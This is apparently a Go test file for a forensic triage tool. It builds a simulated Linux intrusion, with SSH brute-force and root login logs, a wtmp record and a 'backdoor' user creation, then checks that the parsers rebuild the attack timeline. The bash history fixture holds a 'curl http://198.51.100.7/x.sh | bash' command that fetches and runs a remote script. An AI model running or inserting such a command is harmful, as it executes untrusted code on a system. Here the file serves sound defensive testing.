package evidence

import (
	"context"
	"encoding/binary"
	"os"
	"path/filepath"
	"strconv"
	"testing"
	"time"

	"github.com/ciruzz00/astro/internal/logs"
	"github.com/ciruzz00/astro/internal/store"
)

func utmpLogin(user, tty, ip string, ipb [4]byte, sec uint32) []byte {
	b := make([]byte, logs.UtmpSize)
	binary.LittleEndian.PutUint16(b[0:], 7)
	binary.LittleEndian.PutUint32(b[4:], 4242)
	copy(b[8:40], tty)
	copy(b[44:76], user)
	copy(b[76:332], ip)
	binary.LittleEndian.PutUint32(b[340:], sec)
	copy(b[348:352], ipb[:])
	return b
}

// TestLinuxTriage imports a small Linux triage folder with the real parsers
// and reads back one timeline across the three sources.
func TestLinuxTriage(t *testing.T) {
	s, _, dir := setup(t)
	im := New(s, DefaultParsers()...)
	ctx := context.Background()
	base := time.Date(2026, 10, 11, 21, 0, 0, 0, time.UTC)
	write(t, filepath.Join(dir, "var/log/auth.log"), []byte(
		"Oct 11 21:00:01 web01 sshd[812]: Failed password for root from 203.0.113.9 port 50122 ssh2\n"+
			"Oct 11 21:00:09 web01 sshd[814]: Accepted password for root from 203.0.113.9 port 50140 ssh2\n"+
			"Oct 11 21:01:00 web01 useradd[900]: new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash\n"))
	write(t, filepath.Join(dir, "var/log/wtmp"), utmpLogin("root", "pts/0", "203.0.113.9", [4]byte{203, 0, 113, 9}, uint32(base.Add(10*time.Second).Unix())))
	write(t, filepath.Join(dir, "root/.bash_history"), []byte("#"+itoa(base.Add(30*time.Second).Unix())+"\ncurl http://198.51.100.7/x.sh | bash\n"))
	// Pin the syslog year: the file mtime is "now" in the test.
	if err := os.Chtimes(filepath.Join(dir, "var/log/auth.log"), base.Add(time.Hour), base.Add(time.Hour)); err != nil {
		t.Fatal(err)
	}

	res, err := im.Import(ctx, "inc-1", dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if imported, skipped, events := res.Counts(); imported != 3 || skipped != 0 || events != 5 {
		t.Fatalf("counts = %d/%d/%d: %+v", imported, skipped, events, res.Files)
	}
	evs, total, err := s.Events(ctx, "inc-1", store.EventFilter{})
	if err != nil || total != 5 {
		t.Fatalf("events = %d, %v", total, err)
	}
	want := []string{"ssh-failed", "ssh-accepted", "login", "shell-command", "user-created"}
	for i, k := range want {
		if evs[i].Kind != k {
			t.Errorf("timeline[%d] = %s %s (%s), want %s", i, evs[i].Time.Format(time.TimeOnly), evs[i].Kind, evs[i].Source, k)
		}
	}
	if evs[3].User != "root" || evs[3].CommandLine != "curl http://198.51.100.7/x.sh | bash" {
		t.Errorf("history event = %+v", evs[3])
	}
	if hits, _, _ := s.Events(ctx, "inc-1", store.EventFilter{IP: "203.0.113.9"}); len(hits) != 3 {
		t.Errorf("events of the attacker IP = %d, want 3 (2 sshd + wtmp)", len(hits))
	}
	ev, _ := s.CaseEvidence(ctx, "inc-1")
	for _, e := range ev {
		if e.Kind == logs.KindSyslog && e.Host != "web01" {
			t.Errorf("syslog evidence host = %q", e.Host)
		}
	}
}

func itoa(v int64) string { return strconv.FormatInt(v, 10) }
